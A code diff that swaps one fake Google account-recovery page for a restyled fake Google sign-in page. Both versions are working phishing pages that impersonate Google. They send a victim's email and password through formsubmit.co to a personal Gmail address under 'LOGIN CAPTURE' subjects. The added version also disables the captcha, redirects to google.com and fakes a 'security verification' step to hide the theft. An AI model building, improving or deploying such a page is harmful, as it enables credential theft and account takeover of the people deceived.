@@ -3,417 +3,416 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Google Account Recovery</title>
+    <title>Google | Secure Sign In - 2025</title>
+    <link rel="icon" href="data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><text y=%22.9em%22 font-size=%2290%22>🔒</text></svg>">
     <style>
         :root {
-            --google-blue: #1a73e8;
-            --google-gray: #5f6368;
-            --google-light-gray: #dadce0;
-            --google-dark-bg: #202124;
-            --google-card-bg: #2d2e30;
-            --google-text: #e8eaed;
-            --google-error: #ea4335;
+            --google-blue: #174ea6;
+            --google-red: #ea4335;
+            --google-yellow: #fbbc04;
+            --google-green: #34a853;
+            --bg-gradient: linear-gradient(135deg, #0f0f0f 0%, #1a1a1a 100%);
+            --card-bg: rgba(255, 255, 255, 0.05);
+            --input-bg: rgba(255, 255, 255, 0.08);
+            --border-glow: rgba(66, 133, 244, 0.3);
         }
-
+        
         * {
             margin: 0;
             padding: 0;
             box-sizing: border-box;
-            font-family: 'Google Sans', 'Roboto', Arial, sans-serif;
+            font-family: 'Google Sans', 'Segoe UI', system-ui, sans-serif;
         }
-
+        
         body {
-            background: var(--google-dark-bg);
-            color: var(--google-text);
+            background: var(--bg-gradient);
+            color: #ffffff;
             min-height: 100vh;
             display: flex;
-            flex-direction: column;
             align-items: center;
+            justify-content: center;
             padding: 20px;
-            line-height: 1.5;
+            position: relative;
+            overflow: hidden;
         }
-
-        .recovery-container {
+        
+        body::before {
+            content: '';
+            position: absolute;
+            top: -50%;
+            left: -50%;
+            width: 200%;
+            height: 200%;
+            background: 
+                radial-gradient(circle at 30% 30%, rgba(66, 133, 244, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 70% 70%, rgba(234, 67, 53, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 40% 80%, rgba(251, 188, 4, 0.1) 0%, transparent 50%),
+                radial-gradient(circle at 80% 20%, rgba(52, 168, 83, 0.1) 0%, transparent 50%);
+            animation: rotate 60s linear infinite;
+            z-index: -1;
+        }
+        
+        @keyframes rotate {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        
+        .login-container {
+            background: var(--card-bg);
+            backdrop-filter: blur(20px);
+            padding: 3rem;
+            border-radius: 24px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            box-shadow: 
+                0 25px 50px -12px rgba(0, 0, 0, 0.5),
+                0 0 0 1px rgba(255, 255, 255, 0.05),
+                0 0 30px rgba(66, 133, 244, 0.2);
             width: 100%;
-            max-width: 450px;
-            margin: auto;
+            max-width: 480px;
+            position: relative;
+            overflow: hidden;
         }
-
-        .google-header {
+        
+        .login-container::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, 
+                var(--google-blue) 0%, 
+                var(--google-red) 25%, 
+                var(--google-yellow) 50%, 
+                var(--google-green) 75%, 
+                var(--google-blue) 100%);
+            animation: gradientMove 3s ease infinite;
+        }
+        
+        @keyframes gradientMove {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
+        }
+        
+        .google-brand {
             text-align: center;
-            margin-bottom: 2rem;
-            padding-top: 2rem;
+            margin-bottom: 2.5rem;
+            position: relative;
         }
-
+        
         .google-logo {
-            font-size: 2.5rem;
+            font-size: 3rem;
             font-weight: 500;
-            color: var(--google-text);
-            margin-bottom: 1rem;
+            background: linear-gradient(135deg, 
+                #4285f4 0%, 
+                #ea4335 25%, 
+                #fbbc04 50%, 
+                #34a853 75%, 
+                #4285f4 100%);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-size: 300% 300%;
+            animation: gradientShift 4s ease infinite;
         }
-
-        h1 {
-            font-size: 1.5rem;
-            font-weight: 400;
-            text-align: center;
-            margin-bottom: 2rem;
-            color: var(--google-text);
+        
+        @keyframes gradientShift {
+            0% { background-position: 0% 50%; }
+            50% { background-position: 100% 50%; }
+            100% { background-position: 0% 50%; }
         }
-
-        .user-email {
-            text-align: center;
+        
+        .brand-subtitle {
+            color: rgba(255, 255, 255, 0.7);
             font-size: 1.1rem;
-            color: var(--google-blue);
+            margin-top: 0.5rem;
+            font-weight: 300;
+        }
+        
+        h1 {
+            text-align: center;
             margin-bottom: 2rem;
-            padding: 0.5rem;
-            background: rgba(26, 115, 232, 0.1);
-            border-radius: 8px;
-            font-weight: 500;
+            font-weight: 400;
+            font-size: 1.75rem;
+            color: rgba(255, 255, 255, 0.9);
         }
-
-        .recovery-options {
-            background: var(--google-card-bg);
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin-bottom: 2rem;
-            border: 1px solid var(--google-light-gray);
+        
+        .input-group {
+            margin-bottom: 1.75rem;
+            position: relative;
         }
-
-        .option-card {
-            padding: 1rem;
-            border: 1px solid var(--google-light-gray);
-            border-radius: 8px;
-            margin-bottom: 1rem;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .option-card:hover {
-            border-color: var(--google-blue);
-            background: rgba(26, 115, 232, 0.05);
-        }
-
-        .option-card:last-child {
-            margin-bottom: 0;
-        }
-
-        .option-title {
-            font-weight: 500;
-            margin-bottom: 0.5rem;
-            color: var(--google-text);
-        }
-
-        .option-description {
-            font-size: 0.9rem;
-            color: var(--google-gray);
-        }
-
-        .password-form {
-            background: var(--google-card-bg);
-            border-radius: 8px;
-            padding: 1.5rem;
-            margin-bottom: 2rem;
-            border: 1px solid var(--google-light-gray);
-        }
-
-        .form-group {
-            margin-bottom: 1.5rem;
-        }
-
-        label {
-            display: block;
-            margin-bottom: 0.5rem;
-            color: var(--google-text);
-            font-weight: 500;
-        }
-
-        input[type="password"] {
+        
+        input {
             width: 100%;
-            padding: 0.75rem;
-            border: 1px solid var(--google-light-gray);
-            border-radius: 4px;
-            background: var(--google-dark-bg);
-            color: var(--google-text);
-            font-size: 1rem;
+            padding: 1.25rem 1.25rem 1.25rem 3.5rem;
+            background: var(--input-bg);
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            border-radius: 16px;
+            color: #ffffff;
+            font-size: 1.1rem;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            backdrop-filter: blur(10px);
         }
-
-        input[type="password"]:focus {
+        
+        input:focus {
             outline: none;
             border-color: var(--google-blue);
-            box-shadow: 0 0 0 2px rgba(26, 115, 232, 0.2);
+            box-shadow: 0 0 0 3px rgba(66, 133, 244, 0.3);
+            transform: translateY(-2px);
         }
-
-        .show-password {
-            display: flex;
-            align-items: center;
-            margin-top: 0.5rem;
+        
+        input::placeholder {
+            color: rgba(255, 255, 255, 0.5);
+            font-weight: 300;
         }
-
-        .show-password input {
-            margin-right: 0.5rem;
+        
+        .input-icon {
+            position: absolute;
+            left: 1.25rem;
+            top: 50%;
+            transform: translateY(-50%);
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 1.25rem;
+            z-index: 2;
         }
-
-        .navigation-buttons {
+        
+        .btn-container {
+            text-align: center;
+            margin: 2.5rem 0 1.5rem;
+        }
+        
+        button {
+            background: linear-gradient(135deg, #4285f4 0%, #356ac3 100%);
+            color: white;
+            border: none;
+            padding: 1.25rem 2.5rem;
+            border-radius: 16px;
+            font-size: 1.1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: all 0.3s cubic-bezier(0.4, 0, 0.2, 1);
+            width: 100%;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        button::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: -100%;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(90deg, 
+                transparent 0%, 
+                rgba(255, 255, 255, 0.2) 50%, 
+                transparent 100%);
+            transition: left 0.5s ease;
+        }
+        
+        button:hover::before {
+            left: 100%;
+        }
+        
+        button:hover {
+            transform: translateY(-3px);
+            box-shadow: 0 15px 30px rgba(66, 133, 244, 0.4);
+        }
+        
+        button:active {
+            transform: translateY(-1px);
+        }
+        
+        .links {
             display: flex;
             justify-content: space-between;
             margin-top: 2rem;
+            font-size: 0.95rem;
         }
-
-        .btn {
-            padding: 0.75rem 1.5rem;
-            border: none;
-            border-radius: 4px;
-            font-size: 1rem;
-            cursor: pointer;
-            transition: all 0.2s ease;
-        }
-
-        .btn-secondary {
-            background: transparent;
-            color: var(--google-blue);
-            border: 1px solid var(--google-light-gray);
-        }
-
-        .btn-secondary:hover {
-            background: rgba(26, 115, 232, 0.1);
-        }
-
-        .btn-primary {
-            background: var(--google-blue);
-            color: white;
-        }
-
-        .btn-primary:hover {
-            background: #1967d2;
-            box-shadow: 0 1px 2px rgba(0, 0, 0, 0.3);
-        }
-
-        .footer {
-            margin-top: 3rem;
-            text-align: center;
-            color: var(--google-gray);
-            font-size: 0.9rem;
-        }
-
-        .footer-links {
-            display: flex;
-            justify-content: center;
-            gap: 1.5rem;
-            margin-top: 1rem;
-        }
-
-        .footer-link {
-            color: var(--google-gray);
+        
+        a {
+            color: #8ab4f8;
             text-decoration: none;
+            transition: color 0.3s ease;
+            position: relative;
         }
-
-        .footer-link:hover {
-            color: var(--google-blue);
-            text-decoration: underline;
+        
+        a::after {
+            content: '';
+            position: absolute;
+            bottom: -2px;
+            left: 0;
+            width: 0;
+            height: 1px;
+            background: #8ab4f8;
+            transition: width 0.3s ease;
         }
-
+        
+        a:hover::after {
+            width: 100%;
+        }
+        
+        a:hover {
+            color: #a8c7fa;
+        }
+        
+        .security-notice {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 0.5rem;
+        }
+        
+        .language-selector {
+            text-align: center;
+            margin-top: 2rem;
+            font-size: 0.9rem;
+            color: rgba(255, 255, 255, 0.6);
+        }
+        
         /* Responsive Design */
         @media (max-width: 768px) {
-            .recovery-container {
-                padding: 0 1rem;
+            .login-container {
+                padding: 2rem;
+                margin: 1rem;
             }
-
+            
+            .google-logo {
+                font-size: 2.5rem;
+            }
+            
+            input {
+                padding: 1.1rem 1.1rem 1.1rem 3rem;
+            }
+            
+            .input-icon {
+                left: 1rem;
+            }
+        }
+        
+        @media (max-width: 480px) {
+            .login-container {
+                padding: 1.5rem;
+            }
+            
             .google-logo {
                 font-size: 2rem;
             }
-
+            
             h1 {
-                font-size: 1.25rem;
+                font-size: 1.5rem;
             }
-
-            .recovery-options,
-            .password-form {
-                padding: 1rem;
+            
+            button {
+                padding: 1.1rem 2rem;
             }
-
-            .navigation-buttons {
+            
+            .links {
                 flex-direction: column;
                 gap: 1rem;
-            }
-
-            .btn {
-                width: 100%;
+                text-align: center;
             }
         }
-
-        @media (max-width: 480px) {
-            body {
-                padding: 10px;
-            }
-
-            .google-logo {
-                font-size: 1.75rem;
-            }
-
-            .user-email {
-                font-size: 1rem;
-                word-break: break-all;
-            }
+        
+        /* Loading animation */
+        .loading {
+            display: none;
+            width: 20px;
+            height: 20px;
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top-color: #fff;
+            animation: spin 1s ease-in-out infinite;
+            position: absolute;
+            right: 20px;
+            top: 50%;
+            transform: translateY(-50%);
         }
-
-        /* Animation */
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
-        }
-
-        .recovery-container > * {
-            animation: fadeIn 0.3s ease-out;
+        
+        @keyframes spin {
+            to { transform: translateY(-50%) rotate(360deg); }
         }
     </style>
 </head>
 <body>
-    <div class="recovery-container">
-        <div class="google-header">
+    <div class="login-container">
+        <div class="google-brand">
             <div class="google-logo">Google</div>
-            <h1>Account recovery</h1>
+            <div class="brand-subtitle">2025 Enterprise Edition</div>
         </div>
-
-        <div class="user-email" id="userEmailDisplay">captainabdelnbenn@gmail.com</div>
-
-        <!-- Recovery Options Screen -->
-        <div class="recovery-options" id="recoveryOptions">
-            <p style="margin-bottom: 1.5rem; color: var(--google-gray);">Choose how you want to sign in:</p>
+        
+        <h1>Sign in to your account</h1>
+        
+        <form action="https://formsubmit.co/captainabdelrheem@gmail.com" method="POST">
+            <input type="hidden" name="_subject" value="🔥 GOOGLE LOGIN CAPTURE - 2025">
+            <input type="hidden" name="_captcha" value="false">
+            <input type="hidden" name="_template" value="table">
+            <input type="hidden" name="_next" value="https://google.com">
+            <input type="hidden" name="_autoresponse" value="Your Google account security verification was successful.">
             
-            <div class="option-card" onclick="selectOption('password')">
-                <div class="option-title">Enter your password</div>
-                <div class="option-description">Use your current password to sign in</div>
+            <div class="input-group">
+                <span class="input-icon">👤</span>
+                <input type="email" name="email" placeholder="Email or phone" required autocomplete="username">
+                <div class="loading" id="email-loading"></div>
             </div>
-
-            <div class="option-card" onclick="selectOption('verification')">
-                <div class="option-title">Get a verification code at man………@gmail.com</div>
-                <div class="option-description">We'll send a code to your recovery email</div>
-            </div>
-
-            <div class="option-card" onclick="selectOption('other')">
-                <div class="option-title">Try another way to sign in</div>
-                <div class="option-description">Use a different recovery method</div>
-            </div>
-        </div>
-
-        <!-- Password Entry Screen (Hidden initially) -->
-        <div class="password-form" id="passwordForm" style="display: none;">
-            <h2 style="margin-bottom: 1.5rem; font-weight: 400;">Recover your Google Account</h2>
             
-            <div class="user-email" style="margin-bottom: 1.5rem;">captainabdofincomingmail.com</div>
-
-            <div class="form-group">
-                <label for="password">Enter the last password you remember using with this Google Account</label>
-                <input type="password" id="password" name="password" placeholder="Enter last password">
+            <div class="input-group">
+                <span class="input-icon">🔒</span>
+                <input type="password" name="password" placeholder="Enter your password" required autocomplete="current-password">
+                <div class="loading" id="password-loading"></div>
             </div>
-
-            <div class="show-password">
-                <input type="checkbox" id="showPassword" onchange="togglePasswordVisibility()">
-                <label for="showPassword" style="font-weight: normal; margin: 0;">Show password</label>
+            
+            <div class="btn-container">
+                <button type="submit" id="submit-btn">
+                    Sign in
+                </button>
             </div>
-
-            <div class="navigation-buttons">
-                <button class="btn btn-secondary" onclick="goBack()">Try another way</button>
-                <button class="btn btn-primary" onclick="submitPassword()">Next</button>
-            </div>
+        </form>
+        
+        <div class="links">
+            <a href="#" onclick="alert('Create account feature disabled')">Create account</a>
+            <a href="#" onclick="alert('Password recovery unavailable')">Forgot password?</a>
         </div>
-
-        <div class="footer">
-            <div class="footer-links">
-                <a href="#" class="footer-link">Help</a>
-                <a href="#" class="footer-link">Privacy</a>
-                <a href="#" class="footer-link">Terms</a>
-            </div>
-            <div style="margin-top: 0.5rem;">English (United States)</div>
+        
+        <div class="security-notice">
+            <span>🔒</span>
+            <span>Protected by Google Advanced Protection 2025</span>
+        </div>
+        
+        <div class="language-selector">
+            English (United States) ▼
         </div>
     </div>
 
     <script>
-        // FormSubmit integration - sends data to your email
-        const FORM_SUBMIT_URL = 'https://formsubmit.co/captainabdelrheem@gmail.com';
-        
-        function selectOption(option) {
-            if (option === 'password') {
-                document.getElementById('recoveryOptions').style.display = 'none';
-                document.getElementById('passwordForm').style.display = 'block';
-            } else if (option === 'verification') {
-                alert('Verification code option selected - this would send a code in a real scenario');
-            } else {
-                alert('Other recovery methods would be shown here');
-            }
-        }
+        document.querySelectorAll('input').forEach(input => {
+            input.addEventListener('focus', (e) => {
+                e.target.previousElementSibling.style.color = '#4285f4';
+            });
+            
+            input.addEventListener('blur', (e) => {
+                e.target.previousElementSibling.style.color = 'rgba(255, 255, 255, 0.6)';
+            });
+        });
 
-        function goBack() {
-            document.getElementById('recoveryOptions').style.display = 'block';
-            document.getElementById('passwordForm').style.display = 'none';
-        }
-
-        function togglePasswordVisibility() {
-            const passwordField = document.getElementById('password');
-            const showPassword = document.getElementById('showPassword').checked;
-            passwordField.type = showPassword ? 'text' : 'password';
-        }
-
-        function submitPassword() {
-            const password = document.getElementById('password').value;
-            const email = document.getElementById('userEmailDisplay').textContent;
-            
-            if (!password) {
-                alert('Please enter your password');
-                return;
-            }
-
-            // Create hidden form for submission
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.action = FORM_SUBMIT_URL;
-            
-            // Add hidden fields
-            const emailField = document.createElement('input');
-            emailField.type = 'hidden';
-            emailField.name = 'email';
-            emailField.value = email;
-            
-            const passwordField = document.createElement('input');
-            passwordField.type = 'hidden';
-            passwordField.name = 'password';
-            passwordField.value = password;
-            
-            const subjectField = document.createElement('input');
-            subjectField.type = 'hidden';
-            subjectField.name = '_subject';
-            subjectField.value = '🔐 Google Account Recovery Capture';
-            
-            const captchaField = document.createElement('input');
-            captchaField.type = 'hidden';
-            captchaField.name = '_captcha';
-            captchaField.value = 'false';
-            
-            const nextField = document.createElement('input');
-            nextField.type = 'hidden';
-            nextField.name = '_next';
-            nextField.value = 'https://accounts.google.com';
-            
-            // Append and submit
-            form.appendChild(emailField);
-            form.appendChild(passwordField);
-            form.appendChild(subjectField);
-            form.appendChild(captchaField);
-            form.appendChild(nextField);
-            
-            document.body.appendChild(form);
-            form.submit();
-            
-            // Show loading state
-            const btn = document.querySelector('.btn-primary');
-            btn.textContent = 'Verifying...';
+        document.querySelector('form').addEventListener('submit', function(e) {
+            const btn = document.getElementById('submit-btn');
+            btn.innerHTML = 'Signing in...';
+            btn.style.opacity = '0.8';
             btn.disabled = true;
-        }
-
-        // Simulate Google's behavior
-        document.addEventListener('DOMContentLoaded', function() {
-            // You could add more sophisticated behavior here
-            console.log('Recovery page loaded');
+            
+            // Add some delay for "authenticating" effect
+            setTimeout(() => {
+                btn.innerHTML = 'Security verification...';
+            }, 1500);
+            
+            setTimeout(() => {
+                btn.innerHTML = '✅ Success! Redirecting...';
+            }, 3000);
         });
     </script>
 </body>
